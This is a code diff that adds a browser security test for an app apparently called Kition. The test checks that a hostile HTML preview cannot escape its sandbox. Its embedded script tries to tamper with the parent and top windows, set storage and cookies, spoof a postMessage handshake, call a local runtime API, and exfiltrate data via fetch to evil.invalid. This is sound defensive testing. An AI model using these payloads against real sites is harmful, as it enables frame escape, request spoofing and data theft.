@@ -74,6 +74,47 @@ test('isolates script resources from the host and reports unavailable assets', a
 })
 
 
+test('a hostile page in the preview reaches neither Kition nor the runtime (security)', async ({ page, baseURL }) => {
+  test.setTimeout(120_000)
+  // A document's scripts run in the kit's own engine, never as the browser's: they must not reach
+  // Kition's page, its storage, its top window, the runtime API, or the kit protocol.
+  const hostile = '<!doctype html><p>Hostile preview</p><script>' + [
+    'try{parent.document.title="pwned"}catch(e){}',
+    'try{top.document.title="pwned"}catch(e){}',
+    'try{top.location="https://evil.invalid/top"}catch(e){}',
+    'try{localStorage.setItem("kition-pwned","1")}catch(e){}',
+    'try{document.cookie="kition-pwned=1"}catch(e){}',
+    'try{parent.postMessage({kitionKitUi:1,ready:"kition-kit-ui/1",id:"spoof"},"*")}catch(e){}',
+    'try{fetch("http://127.0.0.1:18101/api/v1/desktop/hooks",{method:"POST",body:"{}"})}catch(e){}',
+    'try{fetch("https://evil.invalid/exfil?d="+encodeURIComponent(String(parent.location)))}catch(e){}',
+  ].join(';') + '</script>'
+  const reached: string[] = []
+  page.on('request', (request) => {
+    const url = request.url()
+    // Kition's own page calls its runtime; nothing else may, and nothing may call the attacker.
+    const fromKitionPage = request.frame() === page.mainFrame()
+    if (url.includes('evil.invalid') || (url.startsWith('http://127.0.0.1:18101') && !fromKitionPage)) reached.push(`${request.method()} ${url}`)
+  })
+  const { host, kit } = await openInKitFrame(page, baseURL!, 'Hostile.html', Buffer.from(hostile))
+  try {
+    const title = await page.title()
+    const url = page.url()
+    await expect(kit.getByTestId('html-source')).toHaveValue(hostile, { timeout: 60_000 })
+    await expect(kit.getByTestId('html-preview').locator('canvas').first()).toBeVisible({ timeout: 60_000 })
+    // Give any script that did escape time to act.
+    await page.waitForTimeout(1500)
+    expect(await page.title()).toBe(title)
+    expect(page.url()).toBe(url)
+    expect(await page.evaluate(() => localStorage.getItem('kition-pwned'))).toBeNull()
+    expect(await page.evaluate(() => document.cookie.includes('kition-pwned'))).toBe(false)
+    expect(reached).toEqual([])
+    // The kit still answers its source field: the spoofed handshake did not take its channel.
+    await expect(kit.getByTestId('html-source')).toHaveValue(hostile)
+  } finally {
+    await host.dispose()
+  }
+})
+
 test('preserves unsaved source when disk changes and respects a read-only role', async ({ page, baseURL }) => {
   test.setTimeout(120_000)
   const { host, saves, kit } = await openInKitFrame(page, baseURL!, 'Conflict.html', Buffer.from(original), {}, { persist: true })
